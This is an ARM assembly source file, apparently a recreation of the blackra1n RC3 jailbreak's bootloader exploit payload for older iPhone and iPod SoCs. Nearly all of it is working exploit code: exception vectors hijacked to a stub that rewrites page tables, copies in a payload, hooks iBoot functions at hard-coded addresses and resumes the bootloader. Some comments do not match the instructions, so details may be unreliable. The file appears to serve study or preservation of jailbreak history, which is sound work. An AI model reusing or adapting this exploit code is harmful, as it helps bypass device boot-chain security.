/*
 * blackra1n RC3 — ARM entry / exploit landing pad
 *
 * Recreated from orig/payload.bin offsets 0x0000–0x0288.
 * This is the code that runs when the overwritten exception vectors
 * fire, plus the small Thumb trampolines the C payload uses.
 *
 * Build with: arm-none-eabi-as -march=armv6 entry.S
 */

    .syntax unified
    .arch   armv6
    .arm
    .global _start
    .global exploit_stub
    .global memcpy32
    .global bswap32
    .global icache_invalidate
    .global payload_main
    .global memcpy_words

    .equ    PAYLOAD_VA,     0x00100000
    .equ    COPY_SIZE,      0x4000
    .equ    PTE_FLAGS,      0x00000C1E      @ section, cached, AP=11

/* ------------------------------------------------------------------ */
/* Exception vectors. Every entry branches to exploit_stub.           */
/* The eight words at 0x20 are unused (original stores 0x00000040).   */
/* ------------------------------------------------------------------ */
    .section .text
    .org    0
_start:
    b       exploit_stub            @ reset
    b       exploit_stub            @ undef
    b       exploit_stub            @ svc
    b       exploit_stub            @ prefetch abort
    b       exploit_stub            @ data abort
    b       exploit_stub            @ reserved
    b       exploit_stub            @ irq
    b       exploit_stub            @ fiq
    .word   0x00000040, 0x00000040, 0x00000040, 0x00000040
    .word   0x00000040, 0x00000040, 0x00000040, 0x00000040

/* ------------------------------------------------------------------ */
/* exploit_stub                                                       */
/*                                                                    */
/* Runs at address 0 (vector page) in the context of an iBoot         */
/* exception. Identifies the SoC from LR[31:24], writes a 1 MB        */
/* section PTE so VA 0x00100000 maps the uploaded payload, copies     */
/* 16 KB into that window, then jumps there.                          */
/*                                                                    */
/* On S5L8920 (LR high byte 0x4F):                                    */
/*   load addr 0x41000000, map phys 0x42000000, device id 0           */
/* On S5L8900:                                                        */
/*   load addr 0x09000000, map phys 0x0A000000, device id 1           */
/* On S5L8922 (LR high byte 0x0F):                                    */
/*   same map as S5L8900, device id 2                                 */
/*                                                                    */
/* Word 0 of the uploaded image is overwritten with the device id,    */
/* word 1 with the exception return address (LR-4).                   */
/* ------------------------------------------------------------------ */
exploit_stub:
    push    {r0-r12, lr}
    mov     r0, #0x18
    str     r0, [sp, #0x34]         @ pretend CPSR/mode slot

    mrc     p15, 0, r5, c2, c0, 0   @ TTBR0
    lsr     r5, r5, #14
    lsl     r5, r5, #14             @ 16 KB-align first-level table

    lsr     r4, lr, #24
    cmp     r4, #0x4F
    moveq   r1, #0x41000000         @ 3GS load address
    moveq   r2, #0x42000000         @ 3GS physical for VA 0x00100000
    moveq   r3, #0                  @ device id 0
    movne   r1, #0x09000000
    movne   r2, #0x0A000000
    movne   r3, #1                  @ device id 1
    cmp     r4, #0x0F
    moveq   r3, #2                  @ device id 2 (iPod touch 3G)

    str     r3, [r1]                @ payload[0] = device id
    sub     lr, lr, #4
    str     lr, [r1, #4]            @ payload[1] = saved PC

    orr     r2, r2, #0x1E
    orr     r2, r2, #0xC00          @ section descriptor: cached, AP=11
    str     r2, [r5, #4]            @ TTB[1] maps VA 0x00100000

    mov     r0, #PAYLOAD_VA
    mov     r2, #COPY_SIZE
    bl      memcpy32                @ copy payload into VA window

    mov     r0, #PAYLOAD_VA
    add     pc, pc, r0              @ jump to stub_after_reloc in VA space
    nop
    nop

/* Now executing at VA 0x001000B4. Patch iBoot, restore vectors, return. */
stub_after_reloc:
    bl      payload_main

    mov     r0, #0                  @ dest = exception vectors
    ldr     r1, =g_iboot
    ldr     r1, [r1]
    ldr     r1, [r1, #4]            @ original vector page saved by main
    mov     r2, #0x40
    bl      memcpy_words
    bl      icache_invalidate

    ldr     lr, =stub_saved_lr
    ldr     lr, [lr]
    pop     {r0-r12, pc}            @ resume iBoot

    .align  4
    nop
    nop
    nop
    nop
    nop
    nop

/* ------------------------------------------------------------------ */
/* iboot_hook_entry — installed into an iBoot vtable slot.            */
/* Saves the whole register file at PAYLOAD_VA+8, switches to a       */
/* scratch stack, calls prepare_ramdisk_boot, then jumps to the       */
/* original saved PC.                                                 */
/* ------------------------------------------------------------------ */
    .global iboot_hook_entry
iboot_hook_entry:
    mov     r3, #PAYLOAD_VA
    add     r3, r3, #8
    stm     r3, {r0-r14}            @ r0-r12, sp, lr  (15 regs)

    ldr     r1, =g_iboot
    ldr     r1, [r1]
    ldr     r1, [r1, #8]
    mov     r2, #0x02000000
    add     sp, r1, r2              @ SP = iboot_base + 32 MB

    bl      prepare_ramdisk_boot

    mov     r3, #PAYLOAD_VA
    add     r3, r3, #8
    ldm     r3, {r0-r14}
    mov     r3, #PAYLOAD_VA
    ldr     pc, [r3, #4]            @ saved exception PC

/* dest in r0, src in r1, byte length in r2 (word-aligned). */
memcpy32:
    add     r2, r2, r0
1:
    ldr     r3, [r1], #4
    str     r3, [r0], #4
    cmp     r0, r2
    bne     1b
    bx      lr

    .align  4
    nop
    nop

bswap32:
    rev     r0, r0
    bx      lr

    .align  4
    nop
    nop
    nop
    nop

/* Instruction-cache invalidate, all. The surrounding nops are in the */
/* original blob — they keep the MCR off a cache-line boundary.       */
icache_invalidate:
    nop
    nop
    nop
    nop
    mov     r0, #0
    mcr     p15, 0, r0, c7, c5, 0
    nop
    nop
    nop
    nop
    bx      lr

    .align  4
    nop
    nop
    nop

/* Hard-coded call into iBoot-359.3 on S5L8920 at 0x4FF1E59D (Thumb). */
    .global call_iboot_4FF1E59D
call_iboot_4FF1E59D:
    push    {r4-r7, lr}
    ldr     r0, [r1, #0x18]
    mov     r1, #0x40
    mov     r4, #0x9D
    mov     r5, #0xE5
    lsl     r5, r5, #8
    orr     r4, r4, r5
    mov     r5, #0xF1
    lsl     r5, r5, #16
    orr     r4, r4, r5
    mov     r5, #0x4F
    lsl     r5, r5, #24
    orr     r4, r4, r5              @ r4 = 0x4FF1E59D
    blx     r4
    pop     {r4-r7, pc}

/* ------------------------------------------------------------------ */
/* Thumb trampolines. Addresses are even, so BX stays in ARM.         */
/* ------------------------------------------------------------------ */
    .thumb
    .align  2
    .global tramp_thumb_to_load_hook
tramp_thumb_to_load_hook:
    ldr     r3, =load_hook_wrapper
    bx      r3

    .align  2
    .global tramp_thumb_to_lzss
tramp_thumb_to_lzss:
    ldr     r1, =lzss_thunk
    bx      r1

    .arm
    .align  2
str_geohot:
    .asciz  "geohot"
str_tagline:
    .asciz  "black is the new purple"

/* Thumb: copy 64 KB of iBoot down over its own header, then BLX into */
/* iBoot at (base + 0x3969). Used on the old S5L8900 path.            */
    .thumb
    .global thumb_relocate_iboot
    .align  2
thumb_relocate_iboot:
    mov     r0, sp
    lsrs    r0, r0, #24
    lsls    r0, r0, #24             @ r0 = SP & 0xFF000000
    mov     r1, r0
    adds    r1, #0x40
    mov     r4, r1
    movs    r2, #1
    lsls    r2, r2, #16             @ 0x10000
    adds    r2, r2, r0
1:
    ldr     r3, [r1]
    adds    r1, #4
    str     r3, [r0]
    adds    r0, #4
    cmp     r0, r2
    bne     1b
    movs    r0, #0
    mov     r1, r4
    movs    r2, #0
    ldr     r4, =0x00003969
    blx     r4

    .arm
    .align  2

/* Placeholders resolved by the C payload / linker script. */
    .weak   payload_main
    .weak   prepare_ramdisk_boot
    .weak   memcpy_words
    .weak   load_hook_wrapper
    .weak   lzss_thunk
    .weak   g_iboot
    .weak   stub_saved_lr
